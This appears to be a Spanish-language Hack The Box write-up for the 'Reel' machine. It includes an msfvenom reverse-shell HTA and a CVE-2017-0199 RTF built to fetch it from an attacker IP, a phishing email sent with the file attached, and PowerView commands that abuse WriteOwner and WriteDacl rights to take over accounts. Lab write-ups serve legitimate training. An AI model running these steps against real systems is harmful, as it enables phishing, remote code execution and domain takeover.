------
- Tags: #metadata #exiftool #olevba #smtp #RTF #hta #clixml #pscredencial #acls #writeOnwer #Reset-Passwod #WriteDacl #information-leakage #active-directory
- ------
## Técnicas utilizadas
- Metadata Inspection  
- SMTP Enumeration (VRFY Manual vs smtp-user-enum)  
- Crafting a malicious RTF document [PHISHING] CVE-2017-0199  
- Sending an email to get command execution [RCE]  
- Playing with PSCredential Objects (XML files | PowerShell - Import-CliXml)  
- ACLs Inspection (Active Directory Enumeration)  
- Abusing WriteOwner Active Directory Rights  
- Playing with PowerView (Set-DomainObjectOwner, Add-DomainObjectAcl & Set-DomainUserPassword)  
- Abusing WriteDacl Active Directory Rights  
- Information Leakage [Privilege Escalation]
## Procedimiento

![[Pasted image 20230731164535.png]]

#### Reconocimiento
Si lanzamos un **nmap** sobre la maquina, nos reporta los siguientes puertos abiertos:
```ruby
# nmap -sCV -p21,22,25,135,139,445,593,49159 -oN Ports 10.10.10.77
Nmap scan report for 10.10.10.77
Host is up (0.14s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18  12:19AM       <DIR>          documents
22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey: 
|   2048 8220c3bd16cba29c88871d6c1559eded (RSA)
|   256 232bb80a8c1cf44d8d7e5e6458803345 (ECDSA)
|_  256 ac8bde251db7d838389b9c16bff63fed (ED25519)
25/tcp    open  smtp?
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello: 
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help: 
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|   TerminalServerCookie: 
|     220 Mail Service ready
|_    sequence of commands
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49159/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.93%I=7%D=8/1%Time=64C86622%P=x86_64-pc-linux-gnu%r(NULL,
SF:18,"220\x20Mail\x20Service\x20ready\r\n")%r(Hello,3A,"220\x20Mail\x20Se
SF:rvice\x20ready\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n")%r
SF:(Help,54,"220\x20Mail\x20Service\x20ready\r\n211\x20DATA\x20HELO\x20EHL
SF:O\x20MAIL\x20NOOP\x20QUIT\x20RCPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n")
SF:%r(GenericLines,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20se
SF:quence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\
SF:n")%r(GetRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20s
SF:equence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r
SF:\n")%r(HTTPOptions,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x2
SF:0sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands
SF:\r\n")%r(RTSPRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\
SF:x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comman
SF:ds\r\n")%r(RPCCheck,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSVers
SF:ionBindReqTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSStatusRequ
SF:estTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SSLSessionReq,18,"22
SF:0\x20Mail\x20Service\x20ready\r\n")%r(TerminalServerCookie,36,"220\x20M
SF:ail\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n
SF:")%r(TLSSessionReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Kerberos
SF:,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SMBProgNeg,18,"220\x20Mail
SF:\x20Service\x20ready\r\n")%r(X11Probe,18,"220\x20Mail\x20Service\x20rea
SF:dy\r\n")%r(FourOhFourRequest,54,"220\x20Mail\x20Service\x20ready\r\n503
SF:\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x
SF:20commands\r\n")%r(LPDString,18,"220\x20Mail\x20Service\x20ready\r\n")%
SF:r(LDAPSearchReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(LDAPBindReq
SF:,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SIPOptions,162,"220\x20Mai
SF:l\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n50
SF:3\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\
SF:x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x
SF:20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20command
SF:s\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence
SF:\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x
SF:20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20
SF:commands\r\n");
Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -24m29s, deviation: 34m35s, median: -4m32s
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: REEL
|   NetBIOS computer name: REEL\x00
|   Domain name: HTB.LOCAL
|   Forest name: HTB.LOCAL
|   FQDN: REEL.HTB.LOCAL
|_  System time: 2023-08-01T02:54:02+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2023-08-01T01:54:00
|_  start_date: 2023-08-01T01:48:09
| smb2-security-mode: 
|   302: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug  1 01:59:10 2023 -- 1 IP address (1 host up) scanned in 211.34 seconds
```

----------
#### Metadata Inspection  
El servicio **FTP** que corre en el puerto **21** esta abierto, además, acepta autentificación de forma anonima. Dentro, encontramos un **readme.txt**, **AppLocker.docx** y **Windows Event Forwarding.docx**. El archivo **readme.txt** contiene lo siguiente:
```
please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here.
```

Bueno, ahora, con la herramienta **olevba** vamos intentar listar las macros de los archivos  **.docx** en busca de algo interesante pero, nos damos cuenta de que no hay nada de utilidad.
Con **exiftool** podemos listar los metadatos de estos mismos archivos, y dentro, encontraremos un correo el cual nos servira quizás más adelante:
![[Pasted image 20230801020255.png]]

----------
#### SMTP Enumeration (VRFY Manual vs smtp-user-enum) 
Con el correo en nuestra disposición, podemos confirmar si es valido o no. En este caso usaremos **telnet** pero también se puede hacer con **netcat**:
```
# telnet 10.10.10.10 25
> HELO hola.com
```

**Listamos el panel de ayuda**:
```
> HELP
```

**Validamos el correo**:
```
> VRFY <correo>
```

**Enviar un correo**:
```
> MAIL FROM: <sexcott@megabank.com>
250 OK
> RCPT TO: <nico@megabank.com>
```

Por otro lado, podemos automatizar esto con la herramienta **smtp-user-enum**:
```
# smtp-user-enum -M RCPT -U diccionario_users.txt -t 10.10.10.10
```

Y obtenemos el mismo resultado:
![[Pasted image 20230801023119.png]]

****
#### Crafting a malicious RTF document [PHISHING] CVE-2017-0199  
Con el correo valido, solo nos queda crear un archivo **RTF** que nos permita abusar de este. Hay un [repositorio](https://github.com/bhdresh/CVE-2017-0199) en github que nos puede dar una mano.

Primero vamos a crear un archivo **.hta** malicioso con **msfvenom**:
```
# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.30 LPORT=433 -f hta-psh -o malciious.hta
```

Ahora, con el repositorio en nuestra maquina, haremos lo siguiente:
```
# python2 cve-2017-0199_toolkit.py -M gen -w nudes.rtf -u http://10.10.14.30/malciious.hta -t RTF -x 0 
```

-----------------
#### Sending an email to get command execution [RCE]  
Con todo esto, solo nos queda mandar el correo al individiuo. Lo haremos en este caso con la herramienta **sendEmail**:
```json
# sendEmail -f sexcott@megabank.com -t nico@megabank.com -u "HOLA" -m "ADIOS" -s 10.10.10.10:25 -a nudes.rtf -v
```

`-f`: Indica quien lo envia.
`-t`: Indica a quien sera enviado el correo.
`-u`: Indica el asunto del mensaje.
`-m`: Indica el mensaje del correo. 
`-a`: Indica el archivo a tramitar
`-v`: Modo verbose

En otra terminal, tenemos que estar en escucha para recibir la reverse shell.

------
#### Playing with PSCredential Objects (XML files | PowerShell - Import-CliXml)  
En el directorio en el que nos encontramos, hay un **.xml** el cual contiene credenciales no legibles. Podemos leer este archivo con **Powershell** con el modulo **CliXml**:
```
C:\Users\nico\Desktop>powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.getNetworkCredential() | Format-List *"
```

Con esta credenciales podemos contectanos con **SSH** como **Tom**.

------------------
#### ACLs Inspection (Active Directory Enumeration)  
Dentro del directorio personal de **TOM** podemos ver un directorio de nombre **AD audit** el cual, en su interior contiene unos archivos:
```
tom@REEL C:\Users\tom\Desktop\AD Audit>dir                                                                                      
 Volume in drive C has no label.                                                                  
 Volume Serial Number is CEBA-B613                                                                                              
Directory of C:\Users\tom\Desktop\AD Audit                                                                                     
05/29/2018  09:02 PM    <DIR>          .                                                           
05/29/2018  09:02 PM    <DIR>          ..                                                          
05/30/2018  12:44 AM    <DIR>          BloodHound                                                  
05/29/2018  09:02 PM               182 note.txt                                                    
               1 File(s)            182 bytes                                                     
               3 Dir(s)   4,979,916,800 bytes free         
```

El **.txt** basicamente nos dice que hizo una auditoria con **BloodHound** y que no encontro forma de convertise en **domain controller** desde un usuario normal:
```
Findings:                                                                                          
Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).     
Maybe we should re-run Cypher query against other groups we've created.     
```

Luego, tenemos una carpeta de nombre **BloodHound** el cual contiene un archivo con extension **.ps1** de nombre **PowerView**, tambien vemos otro directorio de nombre **Ingestors**, dentro de el, contiene el **BloodHound.exe** y otros archivos, además hay un **acls.csv**:
```
Directory of C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors                                                                
05/29/2018  08:57 PM    <DIR>          .                                                           
05/29/2018  08:57 PM    <DIR>          ..                                                          
11/17/2017  12:50 AM           112,225 acls.csv                                                    
10/28/2017  09:50 PM             3,549 BloodHound.bin                                              
10/24/2017  04:27 PM           246,489 BloodHound_Old.ps1                                          
10/24/2017  04:27 PM           568,832 SharpHound.exe                                              
10/24/2017  04:27 PM           636,959 SharpHound.ps1                                              
               5 File(s)      1,568,054 bytes                                                      
               2 Dir(s)   4,979,851,264 bytes free                                                 
```

Nos lo vamos a traer a nuestra maquina para abrirlo con **LibreOfficce** y ver que contiene en su interior:
```
copy acls.csv \\10.10.10.10\smbFolder\acls.csv
```

Inspeccionando el archivo, podemos filtrar por **TOM** para intentar ver algo:
![[Pasted image 20230801025319.png]]

Vemos que contiene el privilegio **WriteOwner** sobre **Claire**, esto quiere decir que le podemos cambiar la contraseña a este usuario.

--------------
#### Playing with PowerView (Set-DomainObjectOwner, Add-DomainObjectAcl & Set-DomainUserPassword)  
Lo que hariamos ahora, es importarnos el **PowerView.ps1** que habiamos encontrado de antes, y en powershell ejecutariamos el siguiente comando:
```
PS> Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
```

Luego de ejecutar el comando, ejecutaremos esto:
```
PS> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
```

Ahora crearmos una credencial en formato **Secure String**:
```
PS> $cred = ConvertTo-SecureString "sexcott123!$" -AsPlainText -Force
```

Y por ultimo:
```
PS> Set-DomainUserPassword -Identity claire -AccountPassword $cred
```

Terminado estos pasos, nos podemos conectar por **SSH** como el usuario Claire

------------
#### Abusing WriteDacl Active Directory Rights  
Listando los privilegios de **Claire** en el **excel** que encontramos, observamos que tenemos el privilegio **WriteDacl**, el cual nos permite ingresar al grupo del dominio:
![[Pasted image 20230801030635.png]]

Listamos los grupos existentes en el dominio:
```
PS> net group
```

Y encontramos el **Backup_Admins** el cual suena jugozo. Para colarnos a este grupo, lo que haremos sera ejecutar este comando:
```
PS> net group Backup_Admins claire /add
```

#### Information Leakage [Privilege Escalation]
Dentro de este grupo, tenemos la capacidad de listar todo el contenido del directorio de **Administrators**. Dentro del **Desktop** vemos un directorio de nombre **Backup Scripts** el cual contiene algunos archivos en **PowerShell**, podemos buscar recursivamente por la cadena **Password** dentro de todos estos archivos:
```
PS> dir | Select-String "Password"
```

Y encontramos la contraseña del Administrador:
```
Image Administrator
```

Con estas, podemos conectarnos por **SSH** como **Administrator**
